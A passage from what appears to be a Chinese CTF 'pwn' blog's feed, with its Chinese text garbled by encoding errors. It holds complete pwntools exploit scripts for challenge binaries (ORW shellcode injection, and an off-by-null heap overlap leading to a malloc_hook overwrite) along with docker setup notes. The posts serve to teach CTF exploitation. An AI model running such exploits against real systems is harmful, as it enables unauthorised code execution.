class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>ls      = <span class="hljs-keyword">lambda</span> data     :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s        :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./RANDOM&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * 0x0000000000400948</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br>libc = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>seed = libc.time(<span class="hljs-number">0</span>)<br>libc.srand(seed)<br>num = libc.rand()%<span class="hljs-number">50</span><br><span class="hljs-built_in">print</span>(num)<br>p.sendlineafter(<span class="hljs-string">&#x27;please input a guess num:\n&#x27;</span> , <span class="hljs-built_in">str</span>(num))<br>bss_addr = elf.bss() + <span class="hljs-number">0x100</span><br>lss(<span class="hljs-string">&#x27;bss_addr&#x27;</span>)<br>call_read = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  /* read(0, buf, size) */</span><br><span class="hljs-string">  xor rax , rax</span><br><span class="hljs-string">  xor rdi , rdi</span><br><span class="hljs-string">  push 0x100</span><br><span class="hljs-string">  pop rdx</span><br><span class="hljs-string">  add rsi, 0x100</span><br><span class="hljs-string">  syscall</span><br><span class="hljs-string">  call rsi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  /*open(fd , 0)*/</span><br><span class="hljs-string">  push 0x67616c66</span><br><span class="hljs-string">  push 2</span><br><span class="hljs-string">  pop rax</span><br><span class="hljs-string">  mov rdi , rsp</span><br><span class="hljs-string">  xor rsi , rsi</span><br><span class="hljs-string">  syscall</span><br><span class="hljs-string">  /*read(fd , buf , 0x20)*/</span><br><span class="hljs-string">  mov rdi , rax</span><br><span class="hljs-string">  xor rax , rax</span><br><span class="hljs-string">  mov rsi , 0x601180</span><br><span class="hljs-string">  mov rdx , 0x20</span><br><span class="hljs-string">  syscall</span><br><span class="hljs-string">  /*write(1 , buf , 0x20)*/</span><br><span class="hljs-string">  mov rax , 1</span><br><span class="hljs-string">  mov rdx , 0x20</span><br><span class="hljs-string">  mov rsi , 0x601180</span><br><span class="hljs-string">  mov rdi , 1</span><br><span class="hljs-string">  syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>jmp_rsp = <span class="hljs-number">0x000000000040094E</span><br>payload = asm(call_read)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>payload = payload.ljust(<span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0</span>) + p64(jmp_rsp)<br>payload += asm(<span class="hljs-string">&quot;sub rsp , 0x30 ; jmp rsp&quot;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;your door\n&#x27;</span> , payload)<br>payload =asm(shellcode)<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ ˆ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwnå‡ºé¢˜åˆä½“éªŒ</title>
    <link href="/2024/10/22/pwn%E5%87%BA%E9%A2%98%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <url>/2024/10/22/pwn%E5%87%BA%E9%A2%98%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="PWNéƒ¨ç½²dockeræµ‹è¯•"><a href="#PWNéƒ¨ç½²dockeræµ‹è¯•" class="headerlink" title="PWNéƒ¨ç½²dockeræµ‹è¯•"></a>PWNéƒ¨ç½²dockeræµ‹è¯•</h2><p>è¿™ä¸¤å¤©ç ”ç©¶äº†ä¸€ä¸‹é¢˜ç›®éƒ¨ç½²dockerè¯´ä¸€ä¸‹æ”¶è·</p><h3 id="ä¸€ã€dockeræ‹‰å–ubuntuç¼–è¯‘é¢˜ç›®"><a href="#ä¸€ã€dockeræ‹‰å–ubuntuç¼–è¯‘é¢˜ç›®" class="headerlink" title="ä¸€ã€dockeræ‹‰å–ubuntuç¼–è¯‘é¢˜ç›®"></a>ä¸€ã€dockeræ‹‰å–ubuntuç¼–è¯‘é¢˜ç›®</h3><p>å‡ºé¢˜çš„æ—¶å€™ä¸€å®šè¦æ³¨æ„libcç‰ˆæœ¬ï¼Œå°¤å…¶æ˜¯å †ä½“ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿä¸èƒ½æ¯ä¸ªç‰ˆæœ¬çš„ubuntuéƒ½å®‰è£…ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œæ‰€æœ‰dockeræ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ã€‚</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker pull ubuntu:&lt;ç‰ˆæœ¬å·&gt; <span class="hljs-comment">#æ‹‰å–æ‹‰å–é•œåƒ</span><br>docker <span class="hljs-built_in">run</span> -<span class="hljs-keyword">it</span> ubuntu:&lt;ç‰ˆæœ¬å·&gt; <span class="hljs-comment">#æ‰“å¼€ubuntuç³»ç»Ÿäº¤äº’</span><br>apt update <span class="hljs-comment">#æ›´æ–°æ•°æ®</span><br>apt install gcc -y <span class="hljs-comment">#ä¸‹è½½ç¼–è¯‘å™¨</span><br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥æŠŠcæ–‡ä»¶ä¼ å…¥dockerä¸­è¿›è¡Œç¼–è¯‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">docker cp &lt;æ–‡ä»¶ç›®å½•&gt; &lt;å®¹å™¨ID&gt;:&lt;æ–‡ä»¶è·¯å¾„&gt; <span class="hljs-comment">#å‘å®¹å™¨ä¸­ä¼ é€æ–‡ä»¶</span><br>docker cp &lt;å®¹å™¨ID&gt;:&lt;æ–‡ä»¶è·¯å¾„&gt; &lt;æ–‡ä»¶ç›®å½•&gt; <span class="hljs-comment">#ä»dockerä¸­æ‹‰å–æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><h3 id="äºŒã€éƒ¨ç½²åˆ°docker"><a href="#äºŒã€éƒ¨ç½²åˆ°docker" class="headerlink" title="äºŒã€éƒ¨ç½²åˆ°docker"></a>äºŒã€éƒ¨ç½²åˆ°docker</h3><p>åœ¨ä»“åº“æ‹‰å–ä¸€ä¸‹<a href="https://gitee.com/tky5216/ctf_xinetd.git">é¡¹ç›®</a></p><p>ç„¶åæŒ‰ç…§mdæ–‡ä»¶è¯´æ˜æ“ä½œå°±åƒ</p>]]></content>
    
    
    <categories>
      
      <category>æ‚è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWNå‡ºé¢˜</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>â­off-by-nullåˆ©ç”¨æ‰‹æ³•â­</title>
    <link href="/2024/10/22/%E2%AD%90off-by-null%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E2%AD%90/"/>
    <url>/2024/10/22/%E2%AD%90off-by-null%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E2%AD%90/</url>
    
    <content type="html"><![CDATA[<h1 id="off-by-nullåˆ©ç”¨æ‰‹æ³•"><a href="#off-by-nullåˆ©ç”¨æ‰‹æ³•" class="headerlink" title="off-by-nullåˆ©ç”¨æ‰‹æ³•"></a>off-by-nullåˆ©ç”¨æ‰‹æ³•</h1><p>å…³äºå †å—çš„æ„é€ ä¸€èˆ¬æƒ…å†µä¸‹ä½¿ç”¨ä¸¤å¤´å¤§ä¸­é—´å°çš„æ„é€ ï¼Œå› ä¸ºè¿™æ ·å¯ä»¥å †å—é‡å å»fastbinæ”»å‡»ï¼Œå½“ç„¶ç‰¹æ®Šæƒ…å†µç‰¹æ®Šå¯¹å¾…ã€‚</p><p>ä¸‹é¢è®²è§£ä¸€ä¸‹æ„é€ è¿‡ç¨‹</p><p>ç”³è¯·äº”ä¸ªå †å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x100</span> , <span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x30</span> , <span class="hljs-string">b&#x27;ccc&#x27;</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x68</span> , <span class="hljs-string">b&#x27;dddd&#x27;</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0xf0</span> , <span class="hljs-string">b&#x27;eeee&#x27;</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x10</span> , <span class="hljs-string">b&#x27;ffff&#x27;</span>) <span class="hljs-comment">#4</span><br></code></pre></td></tr></table></figure><p><strong>å…¶ä¸­éœ€è¦æ³¨æ„çš„æ˜¯ç¬¬å››ä¸ªå’Œç¬¬äº”ä¸ªï¼Œç¬¬å››ä¸ªæ˜¯åº”ä¸ºåˆ›å»ºåä¸º0x101ç„¶ååˆ©ç”¨off-by-nullå¯ä»¥å˜æˆ0x100å¤§å°ä¸å˜åªæ˜¯pre_sizeå˜äº†ï¼Œç¬¬äº”ä¸ªæ˜¯é˜²æ­¢å’ŒTop_chunkåˆå¹¶</strong></p><p>ç„¶åæˆ‘ä»¬é€šè¿‡chunk2åˆ©ç”¨off-by-nullæ¼æ´æ¥ä¼ªé€ chunk3å‰è¾¹çš„chunkå·²ç»å…¨éƒ¨è¢«é‡Šæ”¾</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410221952406.png" alt="å›¾1"></p><p>ç„¶åæˆ‘ä»¬å…ˆé‡Šæ”¾chunk0ç„¶åå½“é‡Šæ”¾chunk3çš„æ—¶å€™å°±ä¼šè§¦å‘unlinkï¼Œå¯¼è‡´chunk3å’Œå®ƒå‰è¾¹çš„chunkéƒ½åˆå¹¶ï¼ˆå› ä¸ºæˆ‘ä»¬å·²ç»ä¼ªé€ äº†å‰è¾¹çš„chunkä¸ºä¸€ä¸ªï¼Œä¸”å·²ç»é‡Šæ”¾ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410221952050.png" alt="å›¾2"></p><p>æˆ‘çœ‹å¯ä»¥çœ‹åˆ°chunk1å’Œchunk2å·²ç»è¢«åŒ…æ‹¬è¿›å»ï¼Œè¿™å°±é€ æˆäº†å †å—é‡å </p><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/babyheap">ä¾‹é¢˜ä¸‹è½½</a></p><h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>æ‰“å¼€idaä¸ºç»å…¸å †é¢˜</p><p>æŸ¥çœ‹addå‡½æ•°ï¼Œæ­£å¸¸ç”³è¯·å †å—</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410221913656.png" alt="addå‡½æ•°"></p><p>editå‡½æ•°ä¹Ÿæ²¡æœ‰å­˜åœ¨å †æº¢å‡º</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410221914138.png" alt="editå‡½æ•°"></p><p>showå‡½æ•°æ­£å¸¸æ‰“å°chunkçš„å†…å®¹</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410221915839.png" alt="showå‡½æ•°"></p><p>deleteå‡½æ•°ä¹Ÿä¸å­˜åœ¨UAF</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410221916816.png" alt="deleteå‡½æ•°"></p><p>ä½†æ˜¯åœ¨read_inputä¸­å‘ç°æ¼æ´ï¼Œå­˜åœ¨off-by-nullæ¼æ´</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410221917668.png" alt="read_input"></p><p>è§£é¢˜æ€è·¯ä¸º</p><ol><li>åˆ©ç”¨off-by-nullæ¼æ´åˆ¶é€ å †å—é‡å </li><li>ç„¶ååˆ©ç”¨å †å—é‡å ä¿®æ”¹fastbinçš„fdæŒ‡é’ˆè¿›è¡Œfastbin attack</li><li>æ‰“malloc_hookç”¨reallocè°ƒèŠ‚rspçš„å€¼ï¼Œä»¥æ»¡è¶³one_gadgetçš„æ¡ä»¶</li></ol><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br>ls      = <span class="hljs-keyword">lambda</span> data               :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s                  :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;babyheap&#x27;</span><br>url = <span class="hljs-string">&#x27;192.168.180.130:3389&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * main</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">===============================                                                     </span><br><span class="hljs-string">          Main Menu           </span><br><span class="hljs-string">=============================== </span><br><span class="hljs-string">1.  Add                      </span><br><span class="hljs-string">2.  Edit                     </span><br><span class="hljs-string">3.  Show                     </span><br><span class="hljs-string">4.  Delete                   </span><br><span class="hljs-string">5.  Exit                     </span><br><span class="hljs-string">=============================== </span><br><span class="hljs-string">Choose an option &gt;&gt; </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Choose an option &gt;&gt; &#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;How much do you want\n&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Enter something?&#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Choose an option &gt;&gt; &#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;input index\n&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Enter something?&#x27;</span> , content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>  p.sendafter(<span class="hljs-string">&#x27;Choose an option &gt;&gt; &#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Give me a index.Let you see see\n&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Choose an option &gt;&gt; &#x27;</span> , <span class="hljs-string">b&#x27;4&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;input index\n&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><br><br>add(<span class="hljs-number">0x100</span> , <span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x30</span> , <span class="hljs-string">b&#x27;ccc&#x27;</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x68</span> , <span class="hljs-string">b&#x27;dddd&#x27;</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0xf0</span> , <span class="hljs-string">b&#x27;eeee&#x27;</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x10</span> , <span class="hljs-string">b&#x27;ffff&#x27;</span>) <span class="hljs-comment">#4</span><br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">12</span> + p64(<span class="hljs-number">0x1C0</span>)<br>edit(<span class="hljs-number">2</span> , payload)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x100</span> , <span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#5</span><br>show(<span class="hljs-number">1</span>)<br>main_arena = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">88</span><br>lss(<span class="hljs-string">&#x27;main_arena&#x27;</span>)<br>malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>base_addr = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>lss(<span class="hljs-string">&#x27;base_addr&#x27;</span>)<br>one_gadget = [<span class="hljs-number">0x4527a</span> , <span class="hljs-number">0xf03a4</span> , <span class="hljs-number">0xf1247</span>]<br>execve = base_addr + one_gadget[<span class="hljs-number">0</span>]<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0xA0</span> , <span class="hljs-string">b&#x27;bbbb&#x27;</span>) <br>fake_chunk = malloc_hook - <span class="hljs-number">0x23</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0x71</span>) + p64(fake_chunk)<br>edit(<span class="hljs-number">2</span> , payload)<br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">b&#x27;ccc&#x27;</span>)<br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">b&#x27;hhh&#x27;</span>)<br>lss(<span class="hljs-string">&#x27;fake_chunk&#x27;</span>)<br>realloc = base_addr + libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>payload = <span class="hljs-number">11</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(execve) + p64(realloc + <span class="hljs-number">14</span>)<br>edit(<span class="hljs-number">5</span> , payload)<br>lss(<span class="hljs-string">&#x27;malloc_hook&#x27;</span>)<br><span class="hljs-comment"># sleep(3)</span><br>p.sendafter(<span class="hljs-string">&#x27;Choose an option &gt;&gt; &#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;How much do you want\n&#x27;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>))<br><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
    <tags>
      
      <tag>off-by-null</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dockeré…ç½®å¿ƒå¾—</title>
    <link href="/2024/10/21/docker%E9%85%8D%E7%BD%AE%E5%BF%83%E5%BE%97/"/>
    <url>/2024/10/21/docker%E9%85%8D%E7%BD%AE%E5%BF%83%E5%BE%97/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸‹è½½docker"><a href="#ä¸‹è½½docker" class="headerlink" title="ä¸‹è½½docker"></a>ä¸‹è½½docker</h2><p>dockerä¸‹è½½ç°åœ¨æ¯”è¾ƒæ–¹ä¾¿ç›´æ¥ç”¨å®˜æ–¹shellè„šæœ¬ä¸€é”®éƒ¨ç½²</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">curl -fsSL https:<span class="hljs-comment">//test.docker.com -o test-docker.sh</span><br>sudo <span class="hljs-keyword">sh</span> <span class="hljs-keyword">test</span>-docker.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><h2 id="é…ç½®docker"><a href="#é…ç½®docker" class="headerlink" title="é…ç½®docker"></a>é…ç½®docker</h2><p>å®‰è£…å¥½åéœ€è¦æ·»åŠ å½“å‰ç”¨æˆ·åˆ°dockerç»„ä¸­ï¼Œé‡å¯ç”Ÿæ•ˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> usermod -aG docker <span class="hljs-variable">$USER</span><br><span class="hljs-built_in">groups</span> <span class="hljs-comment">#æ£€æŸ¥å½“å‰ç”¨æˆ·ç»„</span><br></code></pre></td></tr></table></figure><p>æœ€æœ€å…³é”®çš„ä¸€ç‚¹æ˜¯ä»£ç†é—®é¢˜ï¼Œåˆšå¼€å§‹ä¸€ç›´åœ¨æ¢å›½å†…çš„æºï¼Œä½†æ˜¯è¿˜æ˜¯æ˜¾ç¤ºæˆ‘ç”¨åŸå§‹çš„æºä¸‹è½½ï¼Œå› ä¸ºä»¥å‰éƒ½æ˜¯æ¢æºåè¡Œäº†ï¼Œçªç„¶æŠ¥é”™ï¼Œç ”ç©¶äº†ä¸€ä¸Šåˆï¼Œæœ€åå‘ç°é…ç½®ä¸ªä»£ç†okäº†ï¼Œä¸æ¢æºé…ç½®ä»£ç†ï¼Œåè€Œæ›´å¿«</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<br>  <span class="hljs-string">&quot;proxies&quot;</span><span class="hljs-punctuation">:</span> &#123;<br>    <span class="hljs-string">&quot;http-proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://192.168.15.236:7890&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;https-proxy&quot;</span><span 